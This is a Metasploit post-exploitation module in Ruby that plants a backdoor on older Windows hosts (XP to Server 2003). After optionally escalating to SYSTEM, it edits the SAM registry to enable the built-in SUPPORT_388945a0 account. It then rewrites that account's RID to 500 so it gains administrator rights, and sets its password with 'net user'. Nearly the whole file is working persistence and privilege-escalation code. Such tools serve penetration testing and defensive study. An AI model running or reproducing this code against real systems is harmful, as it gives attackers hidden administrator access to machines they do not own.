##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Trojanize Support Account',
        'Description' => %q{
          This module enables alternative access to servers and workstations
          by modifying the support account's properties. It will enable
          the account for remote access as the administrator user while
          taking advantage of some weird behavior in lusrmgr.msc. It will
          check if sufficient privileges are available for registry operations,
          otherwise it exits.
        },
        'License' => MSF_LICENSE,
        'Author' => 'salcho <salchoman[at]gmail.com>',
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              priv_elevate_getsystem
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('PASSWORD', [true, 'Password of the support user account', 'password']),
        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false])
      ]
    )
  end

  def run
    reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'

    unless is_system?
      if datastore['GETSYSTEM']
        print_status('Trying to get system...')
        res = session.priv.getsystem
        if res[0]
          print_good('Got system!')
        else
          print_error('Unable to get system! You need to run this script.')
          return
        end
      else
        print_error('You need to run this script as system!')
        return
      end
    end

    version = get_version_info
    unless version.build_number.between?(Msf::WindowsVersion::XP_SP0, Msf::WindowsVersion::Server2003_SP2)
      print_error("#{version.product_name} is not supported")
      return
    end

    print_status("Target OS is #{version.product_name}")
    names_key = registry_enumkeys(reg_key + '\\Names')
    unless names_key
      print_error("Couldn't access registry keys")
      return
    end

    rid = -1
    print_status('Harvesting users...')
    names_key.each do |name|
      next unless name.include?('SUPPORT_388945a0')

      print_good("Found #{name} account!")
      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", '')

      if !skey
        print_error("Couldn't open user's key")
        break
      end

      rid = skey['Type']
      print_status("Target RID is #{rid}")
    end

    if rid == -1
      print_error("Couldn't get user's RID...")
      return
    end

    users_key = registry_enumkeys(reg_key)
    users_key.each do |r|
      next if r.to_i(16) != rid

      f = registry_getvaldata(reg_key + "\\#{r}", 'F')
      if check_active(f)
        print_status('Account is disabled, activating...')
        f[0x38] = ['10'].pack('H')
      else
        print_error('Target account is already enabled')
      end

      print_status('Swapping RIDs...!')
      # Overwrite RID to 500 (as administrator)
      f = swap_rid(f, 500)

      open_key = registry_setvaldata(reg_key + "\\#{r}", 'F', f, 'REG_BINARY')
      unless open_key
        print_error("Can't write to registry... Something's wrong!")
        break
      end

      print_status("Setting password to #{datastore['PASSWORD']}")
      cmd = cmd_exec('cmd.exe', "/c net user support_388945a0 #{datastore['PASSWORD']}")
      vprint_status(cmd.to_s)
    end
  end

  def check_active(f_value)
    if f_value[0x38].unpack('H*')[0].to_i == 11
      return true
    else
      return false
    end
  end

  def swap_rid(f_value, rid)
    # This function will set hex format to a given RID integer
    hex = [('%04x' % rid).scan(/.{2}/).reverse.join].pack('H*')
    # Overwrite new RID at offset 0x30
    f_value[0x30, 2] = hex
    return f_value
  end
end
